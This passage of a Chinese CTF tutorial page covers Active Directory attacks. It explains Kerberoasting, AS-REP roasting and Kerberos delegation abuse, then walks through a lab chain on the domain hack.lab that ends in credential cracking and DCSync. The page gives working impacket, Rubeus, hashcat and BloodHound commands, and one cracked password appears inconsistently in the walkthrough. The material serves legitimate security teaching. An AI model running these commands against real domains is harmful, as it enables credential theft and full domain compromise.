+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>    |   返回 TGT（用 krbtgt 的密钥 |                           |
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>    |   加密）+ 会话密钥          |                           |
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>    |                           |                           |
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>    |-- (3) TGS-REQ ----------&gt; |                           |
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>    |   出示 TGT，请求访问        |                           |
+<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>    |   "cifs/WEB01" 的票据      |                           |
+<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>    |                           |                           |
+<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>    | &lt;- (4) TGS-REP ---------- |                           |
+<a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>    |   返回 ST 服务票据（用目标    |                           |
+<a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a>    |   服务账号的密钥加密）       |                           |
+<a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a>    |                           |                           |
+<a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a>    |-- (5) AP-REQ ---------------------------------------&gt; |
+<a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a>    |   出示 ST，请求访问服务      |                           |
+<a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a>    |                                                     |-- (6) 验证通过，建立会话
+</code></pre></div>
+<p>分步解读：</p>
+<ol>
+<li><strong>AS-REQ</strong>：客户端向 KDC 发起认证请求，其中包含一个用用户密码哈希加密的时间戳，证明自己知道密码；</li>
+<li><strong>AS-REP</strong>：KDC 验证通过后返回 <strong>TGT（Ticket Granting Ticket，黄金票据的"原型"）</strong>。TGT 用 <code>krbtgt</code> 账号的密钥加密，客户端自己解不开也没关系，它只需要"拿着"这张票去换别的票。这一步同时返回一个与 KDC 通信用的会话密钥；</li>
+<li><strong>TGS-REQ</strong>：客户端想访问某个服务（比如 WEB01 上的 CIFS 文件共享）时，拿着 TGT 向 KDC 申请该服务的票据，请求里写明服务名（SPN，如 <code>cifs/web01.hack.lab</code>）；</li>
+<li><strong>TGS-REP</strong>：KDC 返回 <strong>ST（Service Ticket，服务票据）</strong>。ST 用 <strong>目标服务账号的密码哈希</strong> 加密——注意这句话，Kerberoasting 的攻击点就在这里；</li>
+<li><strong>AP-REQ</strong>：客户端把 ST 出示给服务端；</li>
+<li>服务端用自己的密钥解开 ST，确认客户端身份合法，建立会话。</li>
+</ol>
+<h3 id="_10">这为什么是攻击的基础<a class="headerlink" href="#_10" title="Permanent link">¶</a></h3>
+<ul>
+<li>整个流程里，<strong>服务端只验证票据本身是否合法，不回域控确认</strong>。所以只要你伪造出一张合法的票据（黄金票据/Silver Ticket），服务端就认——这就是 PTT（Pass The Ticket）类攻击；</li>
+<li>TGT 用 <code>krbtgt</code> 的密钥加密，谁拿到 <code>krbtgt</code> 的哈希，谁就能自己签发任意用户的 TGT（黄金票据），等于域内"上帝"；</li>
+<li>ST 用服务账号的密码哈希加密，如果服务账号密码够弱，就能对 ST 离线爆破（Kerberoasting）。</li>
+</ul>
+<h2 id="_11">常见域内打法概览<a class="headerlink" href="#_11" title="Permanent link">¶</a></h2>
+<p>以下每个手法只讲思想和最典型的命令，目标是让你在 CTF 中遇到对应场景时能立刻反应"该用什么"。</p>
+<h3 id="kerberoasting">Kerberoasting<a class="headerlink" href="#kerberoasting" title="Permanent link">¶</a></h3>
+<p><strong>思想</strong>：任何域用户都可以合法地向 KDC 申请任意服务的服务票据（ST），而 ST 是用 <strong>服务账号的密码哈希</strong> 加密的。把 ST 导出后离线爆破，就能还原出服务账号的明文密码。攻击门槛极低——只需要一个普通域用户。</p>
+<p>前提：目标服务账号配置了 SPN（服务主体名），通常是运行 SQL Server、IIS 等服务的域账号。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1"># 请求所有 SPN 账号的服务票据并导出为可爆破格式</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>impacket-GetUserSPNs<span class="w"> </span>hack.lab/alice:<span class="s1">'Passw0rd!'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.0.0.10<span class="w"> </span>-request
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="c1"># hashcat 爆破（RC4 类型的票据，模式 18200）</span>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>spn.hash<span class="w"> </span>rockyou.txt
+</code></pre></div>
+<p>防御方视角的加固也很简单：服务账号用超长随机密码或 gMSA，就不会被爆出来。反过来，CTF 里一旦拿到服务票据，<code>rockyou.txt</code> 跑一跑大概率能出。</p>
+<h3 id="as-rep-roasting">AS-REP Roasting<a class="headerlink" href="#as-rep-roasting" title="Permanent link">¶</a></h3>
+<p><strong>思想</strong>：Kerberos 的 AS-REP 阶段要求客户端先用密码加密时间戳"自证身份"，这叫 <strong>预认证（Pre-Authentication）</strong>。如果管理员手滑给某个账号勾上了"Do not require Kerberos preauthentication"（不需要预认证），那么任何人——甚至 <strong>不需要任何凭据</strong>——都可以向 KDC 索要这个账号的 AS-REP 数据，其中包含用该账号密码哈希加密的密文，同样可以离线爆破。</p>
+<p>与 Kerberoasting 的区别：Kerberoasting 需要一个域用户凭据（申请 ST 要先有 TGT），AS-REP Roasting 连凭据都不需要。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># 枚举指定用户列表中不需要预认证的账号并导出密文</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>impacket-GetNPUsers<span class="w"> </span>hack.lab/<span class="w"> </span>-usersfile<span class="w"> </span>users.txt<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.0.0.10<span class="w"> </span>-format<span class="w"> </span>hashcat
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="c1"># 若已有任一域凭据，直接枚举全域</span>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>impacket-GetNPUsers<span class="w"> </span>hack.lab/alice:<span class="s1">'Passw0rd!'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.0.0.10<span class="w"> </span>-request
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="c1"># hashcat 爆破（模式 18200，与 Kerberoasting 相同格式）</span>
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>asrep.hash<span class="w"> </span>rockyou.txt
+</code></pre></div>
+<h3 id="_12">委派问题概述（非约束委派）<a class="headerlink" href="#_12" title="Permanent link">¶</a></h3>
+<p><strong>委派（Delegation）</strong> 解决的是"服务替用户办事"的问题：用户访问前端 Web 服务器，Web 服务器需要拿用户的身份去访问后端数据库——这就需要用户把凭证"委托"给 Web 服务器。</p>
+<p><strong>非约束委派（Unconstrained Delegation）</strong> 是最粗暴的实现：用户访问一台配置了非约束委派的机器时，会把自己的 <strong>TGT 直接存进这台机器的内存</strong>。这台机器随即可以用这个 TGT 冒充用户访问任何服务。</p>
+<p>攻击思路：</p>
+<ol>
+<li>找出一台配置了非约束委派、且被你控制（已拿下或有漏洞）的机器；</li>
+<li>在上面监控/导出进入的 TGT（用 Rubeus 的 <code>monitor</code> 功能）；</li>
+<li>想办法诱导域控或高权限用户访问这台机器（比如经典的 Printer Bug / PetitPotam 强制域控回连），它的 TGT 就到手了；</li>
+<li>拿着域控机器账号的 TGT 做 DCSync，导出全域哈希，游戏结束。</li>
+</ol>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c"># Rubeus 监控进入本机的票据（需管理员权限）</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">monitor</span> <span class="p">/</span><span class="n">interval</span><span class="p">:</span><span class="n">5</span> <span class="p">/</span><span class="n">filteruser</span><span class="p">:</span><span class="n">DC01</span><span class="p">$</span>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="c"># 拿到票据后注入当前会话使用（PTT）</span>
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">ptt</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">base64编码的票据</span>
+</code></pre></div>
+<p><strong>一句话</strong>：非约束委派 = 这台机器上会自动"捡到"来访用户的 TGT，捡到谁的就能冒充谁。</p>
+<h3 id="_13">约束委派<a class="headerlink" href="#_13" title="Permanent link">¶</a></h3>
+<p><strong>约束委派（Constrained Delegation）</strong> 是微软对非约束委派的"打补丁"版本：服务只能代替用户访问 <strong>指定的</strong> 服务，而不是任意服务。它依赖两个 Kerberos 扩展：</p>
+<ul>
+<li><strong>S4U2Self</strong>：服务可以"自称"某用户，向 KDC 申请一张该用户访问自己的票据；</li>
+<li><strong>S4U2Proxy</strong>：拿着上面这张票据，向 KDC 换取该用户访问指定后端服务的票据。</li>
+</ul>
+<p>攻击思想：如果你拿下了一个配置了约束委派的服务账号（比如通过 Kerberoasting 爆出了它的密码），就可以利用 S4U2Self + S4U2Proxy 这条链路，冒充域管理员访问被允许委派的后端服务——而后端服务往往就是域控上的 CIFS/LDAP，拿下即等于拿下域控。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1"># 用约束委派账号请求域管理员访问域控 CIFS 的票据</span>
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>impacket-getST<span class="w"> </span>-spn<span class="w"> </span><span class="s1">'cifs/DC01.hack.lab'</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="w">  </span>-impersonate<span class="w"> </span><span class="s1">'administrator'</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="w">  </span><span class="s1">'hack.lab/web-svc:ServicePass123!'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.0.0.10
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="c1"># 设置票据缓存后直接用（Linux 下 PTT）</span>
+<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator.ccache
+<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>impacket-secretsdump<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>hack.lab/administrator@DC01.hack.lab
+</code></pre></div>
+<p>还有更复杂的 <strong>基于资源的约束委派（RBCD）</strong>，核心思想相同：利用委派配置的信任链伪造票据。CTF 里遇到"某个账号密码已知 + 配置了委派"的场景，条件反射就该想到这条链。</p>
+<h3 id="_14">一张速查表<a class="headerlink" href="#_14" title="Permanent link">¶</a></h3>
+<table>
+<thead>
+<tr>
+<th>手法</th>
+<th>前置条件</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Kerberoasting</td>
+<td>任一域用户凭据</td>
+<td>爆出服务账号明文密码</td>
+</tr>
+<tr>
+<td>AS-REP Roasting</td>
+<td>无（账号未启用预认证即可）</td>
+<td>爆出目标账号明文密码</td>
+</tr>
+<tr>
+<td>非约束委派</td>
+<td>控制一台配置非约束委派的机器</td>
+<td>截获访问者的 TGT，PTT 横向</td>
+</tr>
+<tr>
+<td>约束委派</td>
+<td>拿下配置约束委派的服务账号</td>
+<td>冒充管理员访问后端服务</td>
+</tr>
+</tbody>
+</table>
+<h2 id="bloodhound">BloodHound 信息收集简介<a class="headerlink" href="#bloodhound" title="Permanent link">¶</a></h2>
+<p>域一大、机器一多，"谁是谁的管理员、谁能委派到谁、哪条路径通向域管"靠人脑根本理不清。<strong>BloodHound</strong> 就是把域内所有关系画成一张图的工具，让你一眼看出从当前立足点到域管的最短攻击路径。</p>
+<h3 id="_15">工作原理<a class="headerlink" href="#_15" title="Permanent link">¶</a></h3>
+<p>BloodHound 分两部分：</p>
+<ol>
+<li><strong>收集器 SharpHound</strong>：在域内机器上运行（C# 版）或用 <code>bloodhound-python</code> 在攻击机上远程采集，通过 LDAP、SMB 等协议收集域内对象——用户、组、计算机、GPO、ACL、登录会话、委派关系等，导出为 zip（内含一堆 JSON）；</li>
+<li><strong>图数据库 + 前端</strong>：把 zip 导入 Neo4j 数据库，BloodHound 前端以节点-边图展示关系，内置大量查询（如"Shortest Path to Domain Admins"——到域管的最短路径）。</li>
+</ol>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># 远程采集（不需要在域机器上落地文件）</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>bloodhound-python<span class="w"> </span>-u<span class="w"> </span>alice<span class="w"> </span>-p<span class="w"> </span><span class="s1">'Passw0rd!'</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="w">  </span>-d<span class="w"> </span>hack.lab<span class="w"> </span>-dc<span class="w"> </span>DC01.hack.lab<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="w">  </span>-c<span class="w"> </span>All<span class="w"> </span>--zip
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="c1"># 或在域内机器上运行 SharpHound</span>
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>SharpHound.exe<span class="w"> </span>-c<span class="w"> </span>All<span class="w"> </span>--zipfilename<span class="w"> </span>bloodhound.zip
+</code></pre></div>
+<p>导入后在查询框里点 <strong>"Shortest Path to Domain Admins"</strong>，它会直接画出类似这样的路径：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>alice → (GenericWrite) → svc-web → (AllowedToDelegate) → DC01 → Domain Admins
+</code></pre></div>
+<p>每一条边都对应一种可利用的关系（写权限、委派、组嵌套、本地管理员……），顺着边打就行。</p>
+<h3 id="ctf">CTF 中的实用提示<a class="headerlink" href="#ctf" title="Permanent link">¶</a></h3>
+<ul>
+<li>大型内网靶场题中，BloodHound 基本必用，"最短路径"查询通常是解题钥匙；</li>
+<li>关注 <code>DCSync</code>、<code>GenericAll</code>、<code>WriteDacl</code>、<code>AllowedToDelegate</code> 这几类高危边；</li>
+<li>数据有时效性：收集的时间点不同，会话（Session）信息会变化，路径可能时有时无。</li>
+</ul>
+<h2 id="web">例题实战：从 Web 入口到域控<a class="headerlink" href="#web" title="Permanent link">¶</a></h2>
+<p>下面是一道典型的内网综合题的完整思路，把本章知识点串起来。题目拓扑：边界一台 Web 服务器（工作组机器，双网卡），内网是一个 <code>hack.lab</code> 域（DC01 为域控，IP <code>10.0.0.10</code>，另有数据库服务器 SQL01）。</p>
+<p><strong>第一步：Web 打点。</strong> 边界 Web 站存在文件上传漏洞（利用思路见本书「文件上传」一章），上传 WebShell 后执行命令，用 Potato 类工具提权拿到 SYSTEM。建立隧道，把内网流量代理进攻击机。</p>
+<p><strong>第二步：信息收集，识别域环境。</strong> 在 Web 服务器上翻到一个配置文件 <code>web.config</code>，里面有数据库连接串：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="nt">&lt;connectionStrings&gt;</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="w">  </span><span class="nt">&lt;add</span><span class="w"> </span><span class="na">name=</span><span class="s">"db"</span><span class="w"> </span><span class="na">connectionString=</span><span class="s">"Server=SQL01.hack.lab;Database=app;</span>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="s">       User Id=svc-sql;Password=Sql@2024!"</span><span class="nt">/&gt;</span>
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a><span class="nt">&lt;/connectionStrings&gt;</span>
+</code></pre></div>
+<p><code>SQL01.hack.lab</code> 这个域名后缀暴露了内网域名 <code>hack.lab</code>。顺着「敏感信息泄露」的思路，把凭据 <code>svc-sql / Sql@2024!</code> 记下来。</p>
+<p><strong>第三步：域控定位与验证。</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1"># 通过代理对内网定位域控</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.0.0.0/24
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="c1"># 输出中 DC01 的签名和域名列会标明它是域控</span>
+</code></pre></div>
+<p><strong>第四步：Kerberoasting。</strong> 手头的 <code>svc-sql</code> 是域账号（连接的是域内 SQL Server），先试它能否认证域，再用它（或任一域凭据）发起 Kerberoasting：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>impacket-GetUserSPNs<span class="w"> </span><span class="s1">'hack.lab/svc-sql:Sql@2024!'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.0.0.10<span class="w"> </span>-request
+</code></pre></div>
+<p>导出一张 <code>http/webbackup.hack.lab</code> 服务账号 <code>svc-backup</code> 的票据，hashcat 爆破：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>spn.hash<span class="w"> </span>rockyou.txt
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="c1"># 爆出：Backup@123</span>
+</code></pre></div>
+<p><strong>第五步：BloodHound 找路径。</strong> 用新凭据采集域信息：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>bloodhound-python<span class="w"> </span>-u<span class="w"> </span>svc-backup<span class="w"> </span>-p<span class="w"> </span><span class="s1">'Backup@123'</span><span class="w"> </span>-d<span class="w"> </span>hack.lab<span class="w"> </span>-dc<span class="w"> </span>DC01.hack.lab<span class="w"> </span>-c<span class="w"> </span>All<span class="w"> </span>--zip
+</code></pre></div>
+<p>导入后发现：<code>svc-backup</code> 账号配置了到 DC01 上 <code>cifs</code> 服务的 <strong>约束委派</strong>。</p>
+<p><strong>第六步：约束委派攻击，拿下域控。</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c1"># 冒充域管 administrator 申请访问 DC01 CIFS 的票据</span>
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>impacket-getST<span class="w"> </span>-spn<span class="w"> </span><span class="s1">'cifs/DC01.hack.lab'</span><span class="w"> </span>-impersonate<span class="w"> </span><span class="s1">'administrator'</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="w">  </span><span class="s1">'hack.lab/svc-backup:Backup@123!'</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.0.0.10
+<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>
+<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator.ccache
+<a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>
+<a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="c1"># 用票据直接 DCSync，导出全域哈希（krbtgt、administrator 全到手）</span>
+<a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>impacket-secretsdump<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>hack.lab/administrator@DC01.hack.lab
+</code></pre></div>
+<p><strong>第七步：拿 flag。</strong> flag 在域控桌面：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>impacket-wmiexec<span class="w"> </span>-k<span class="w"> </span>-no-pass<span class="w"> </span>hack.lab/administrator@DC01.hack.lab
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="c1"># C:\&gt; type C:\Users\Administrator\Desktop\flag.txt</span>
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="c1"># flag{4d_penetrati0n_from_web_t0_dc}</span>
+</code></pre></div>
+<p><strong>复盘</strong>：Web 漏洞打点 → 配置文件泄露域凭据 → Kerberoasting 爆破服务账号 → BloodHound 发现委派路径 → 约束委派冒充域管 → DCSync 拿下全域。每一步都对应本章的一个知识点。</p>
+<h2 id="_16">小结与延伸<a class="headerlink" href="#_16" title="Permanent link">¶</a></h2>
+<p>本章讲了域渗透的骨架：域的本质是集中式账号管理，域控是全域的核心；Kerberos 认证中 TGT/ST 的加密密钥决定了攻击面——<code>krbtgt</code> 密钥失守就是黄金票据，服务账号密钥弱就被 Kerberoasting；委派机制的设计缺陷让"服务替用户办事"变成了权限提升的跳板；BloodHound 把复杂的信任关系变成一张能看懂的图。</p>
+<p>想继续深入，可以按这个顺序补：PTT 与金银票据的细节、DCSync 与 NTDS.dit 的提取、ACL 滥用（DCSync 权限、GenericAll）、以及 Exchange、AD CS（证书服务）等新攻击面。工具链上，Impacket 全家桶 + Rubeus + BloodHound 足以应付绝大多数 CTF 域渗透场景。</p></div>
+
+<!-- Source file information -->
+
+
+<!-- Was this page helpful? -->
+
+  
+
+
+
+
+<!-- Previous and next pages link -->
+<nav
+class="md-footer__inner md-grid"
+aria-label="页脚"
+
+>
+
+<!-- Link to previous page -->
+
+  
+  <a
+    href="../multi_layer/"
+    class="md-footer__link md-footer__link--prev"
+    aria-label="上一页: 多层网络综合"
+    rel="prev"
+  >
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+    </div>
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        上一页
+      </span>
+      <div class="md-ellipsis">
+        多层网络综合
+      </div>
+    </div>
+  </a>
+
+
+<!-- Link to next page -->
+
+  
+  <a
+    href="../lateral/"
+    class="md-footer__link md-footer__link--next"
+    aria-label="下一页: 横向移动"
+    rel="next"
+  >
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        下一页
+      </span>
+      <div class="md-ellipsis">
+        横向移动
+      </div>
+    </div>
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+    </div>
+  </a>
+
+</nav>
+
+<!-- Comment system -->
+
+  <h2 id="__comments">评论</h2>
+
+  <!-- giscus：主题与外壳 hc-theme 同步（初始 + 切换时 postMessage） -->
+  <script src="https://giscus.app/client.js"
+    data-repo="ProbiusOfficial/Hello-CTF"
+    data-repo-id="R_kgDOJXX6hg"
+    data-category="Show and tell"
+    data-category-id="DIC_kwDOJXX6hs4CXmuV"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="top"
+    data-theme="light"
+    data-lang="zh-CN"
+    crossorigin="anonymous"
+    async>
+  </script>
+  <script>
+    (function () {
+      var script = document.querySelector("script[src*=giscus]");
+      function currentTheme() {
+        var t = null;
+        try { t = localStorage.getItem("hc-theme"); } catch (e) {}
+        return t === "dark" ? "dark" : "light";
+      }
+      /* 初始主题：giscus 加载前写入 data-theme */
+      script.setAttribute("data-theme", currentTheme());
+      /* 外壳主题切换 → 通知 giscus iframe 换肤（由 shell.js 广播 hc-theme-change） */
+      document.addEventListener("hc-theme-change", function (e) {
+        var theme = e.detail === "dark" ? "dark" : "light";
+        var iframe = document.querySelector("iframe.giscus-frame");
+        if (iframe) {
+          iframe.contentWindow.postMessage(
+            { giscus: { setConfig: { theme: theme } } },
+            "https://giscus.app"
+          );
+        }
+      });
+    })();
+  </script>
+
+  <!-- 评论区显示优化 -->
+  <style>
+    #__comments {
+      margin-top: 2.2rem;
+      padding-top: 1.2rem;
+      border-top: 1px solid var(--line, #e6eaf1);
+      font-size: 1rem;
+    }
+    .giscus, .giscus-frame { width: 100%; }
+    .giscus-frame { border: none; color-scheme: light; }
+    [data-md-color-scheme="slate"] .giscus-frame { color-scheme: dark; }
+  </style>
+
+
+<!-- 才懒得给你加空格呢 给你塞个 Pangu.js 哼！ -->
+<head>
+  <script src="https://cdn.jsdelivr.net/npm/pangu.simple@1.0.5/dist/browser/pangu.js"></script>
+  <script>
+    pangu.spacingPage();
+  </script>
+</head>
+      </article>
+      
+        <aside class="hc-toc">
+          <div class="hc-toc-cap">ON THIS PAGE</div>
+          
+  <ul>
+    
+      <li>
+        <a href="#_1">域渗透入门</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_2">工作组与域</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#workgroup">工作组（Workgroup）</a>
+        
+      </li>
+    
+      <li>
+        <a href="#domain">域（Domain）</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#_3">域核心概念</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#dc">域控（DC）与域名</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_4">域用户与域组</a>
+        
+      </li>
+    
+      <li>
+        <a href="#gpo">组策略（GPO）</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#_5">域环境识别与域控定位</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_6">判断是否加入域</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_7">定位域控</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#kerberos">Kerberos 认证流程入门</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_8">三个角色</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_9">认证流程（图解式描述）</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_10">这为什么是攻击的基础</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#_11">常见域内打法概览</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#kerberoasting">Kerberoasting</a>
+        
+      </li>
+    
+      <li>
+        <a href="#as-rep-roasting">AS-REP Roasting</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_12">委派问题概述（非约束委派）</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_13">约束委派</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_14">一张速查表</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#bloodhound">BloodHound 信息收集简介</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#_15">工作原理</a>
+        
+      </li>
+    
+      <li>
+        <a href="#ctf">CTF 中的实用提示</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#web">例题实战：从 Web 入口到域控</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_16">小结与延伸</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+  </ul>
+
+        </aside>
+      
+    </div>
+    <footer class="hc-footer">
+      <span>© 2026 探姬 · Hello CTF</span>
+      <span class="links">
+        <a href="https://github.com/ProbiusOfficial/Hello-CTF" target="_blank" rel="noopener">GitHub</a>
+        <a href="https://github.com/ProbiusOfficial/Hello-CTF/pulls" target="_blank" rel="noopener">参与共建</a>
+        <a href="../../sidebar/feedback.html">反馈与群聊</a>
+      </span>
